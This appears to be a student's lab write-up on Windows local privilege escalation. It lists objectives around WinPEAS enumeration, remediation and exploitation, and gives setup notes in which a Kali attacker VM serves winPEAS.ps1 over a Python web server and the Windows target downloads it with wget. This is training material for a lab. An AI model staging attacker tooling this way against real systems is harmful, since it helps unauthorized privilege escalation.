# Windows Local Privilege Escalation
In this lab we will acheive the following objectives:

1. Run WinPEAS to enumerate a Windows 10 system for misconfigurations

2. Interpret WinPEAS output to identify privilege escalation vectors

3. Analyze common Windows privilege escalation paths

4. Understand remediation strategies for identified vulnerabilities

5. Exploit local privilege escalation vulnerabilities

### We will be using a Windows 10 VM (Target) and a Kali VM (Attacker)

#### Task 1: WinPEAS Enumeration

Notes on steps (input into claude for writeup)

ON KALI
Downloaded winpeas with kali vm using git clone https://github.com/peass-ng/PEASS-ng.git
Downloaded winlocalpriv_escalation.zip onto kali vm
started webserver to get winpeas to win10 vm
python3 -m http.server 8000
ON WINDOWS
wget http://192.168.199.129:8000/winPEAS.ps1 -OutFile winPEAS.ps1
<img width="603" height="334" alt="image" src="https://github.com/user-attachments/assets/dfebb95e-397e-48ed-9f2a-9662e486cf6b" />

